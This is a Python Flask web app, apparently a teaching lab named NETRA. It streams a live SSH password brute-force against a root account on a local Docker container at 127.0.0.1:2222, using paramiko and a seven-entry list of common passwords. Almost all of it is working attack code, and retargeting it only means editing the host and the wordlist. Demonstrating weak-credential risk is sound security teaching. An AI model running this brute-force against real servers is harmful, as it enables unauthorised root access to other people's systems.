from flask import Flask, render_template_string, Response
import paramiko
import time
import json

app = Flask(__name__)

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2222
USERNAME = "root"
COMMON_PASSWORDS = ["123456", "password", "admin", "toor", "root", "letmein", "qwerty"]

PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>NETRA — SSH Weak Credentials Lab</title>
    <style>
        body { background: #0A0E1A; color: #E0E0E0; font-family: 'Courier New', monospace; padding: 40px; }
        h1 { color: #D946EF; }
        .card { background: #1A1040; border: 1px solid #2D1B69; border-radius: 8px; padding: 24px; margin-top: 20px; }
        button { background: #D946EF; color: #0A0E1A; border: none; padding: 12px 24px; font-weight: bold; cursor: pointer; border-radius: 4px; font-family: inherit; }
        button:hover { background: #E879F9; }
        button:disabled { background: #555; cursor: not-allowed; }
        #terminal { background: #000; color: #4ADE80; padding: 16px; border-radius: 4px; min-height: 200px; font-size: 14px; white-space: pre-wrap; border: 1px solid #2D1B69; }
        .line-fail { color: #F87171; }
        .line-success { color: #4ADE80; font-weight: bold; }
        .line-info { color: #93C5FD; }
    </style>
</head>
<body>
    <h1>🎯 NETRA — SSH Weak Credential Lab</h1>
    <div class="card">
        <p>Target: <strong>127.0.0.1:2222</strong> (Ubuntu SSH server, Docker container)</p>
        <p>This demonstrates a real credential brute-force attack against a live SSH server using a small
        list of commonly used passwords — the exact technique attackers automate at scale against exposed
        SSH ports.</p>
        <button id="startBtn" onclick="startAttack()">Start Brute Force Attempt</button>
    </div>
    <div class="card">
        <div id="terminal">Click "Start Brute Force Attempt" to begin...\n</div>
    </div>

<script>
function startAttack() {
    const btn = document.getElementById('startBtn');
    const term = document.getElementById('terminal');
    btn.disabled = true;
    term.textContent = '';

    const source = new EventSource('/exploit/stream');
    source.onmessage = function(event) {
        const data = JSON.parse(event.data);
        const span = document.createElement('div');
        span.className = 'line-' + data.type;
        span.textContent = data.text;
        term.appendChild(span);
        term.scrollTop = term.scrollHeight;

        if (data.type === 'success' || data.done) {
            source.close();
            btn.disabled = false;
        }
    };
    source.onerror = function() {
        source.close();
        btn.disabled = false;
    };
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

def sse_event(text, event_type="info", done=False):
    payload = json.dumps({"text": text, "type": event_type, "done": done})
    return f"data: {payload}\n\n"

@app.route("/exploit/stream")
def exploit_stream():
    def generate():
        yield sse_event(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}  User: {USERNAME}")
        yield sse_event(f"[*] Loaded {len(COMMON_PASSWORDS)} common passwords\n")
        time.sleep(0.4)

        for pwd in COMMON_PASSWORDS:
            yield sse_event(f"[*] Trying password: {pwd}", "info")
            time.sleep(0.5)

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    TARGET_HOST, port=TARGET_PORT, username=USERNAME,
                    password=pwd, timeout=4, banner_timeout=4
                )
                yield sse_event(f"[+] SUCCESS — Login accepted with password: '{pwd}'", "success")
                yield sse_event(f"[+] Full shell access now possible with root:{pwd}", "success", done=True)
                client.close()
                return
            except paramiko.AuthenticationException:
                yield sse_event(f"[-] Failed: {pwd}", "fail")
            except Exception as e:
                yield sse_event(f"[!] Connection error: {e}", "fail", done=True)
                return

        yield sse_event("[*] Wordlist exhausted — no weak password matched.", "info", done=True)

    return Response(generate(), mimetype="text/event-stream")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5003, debug=False, threaded=True)
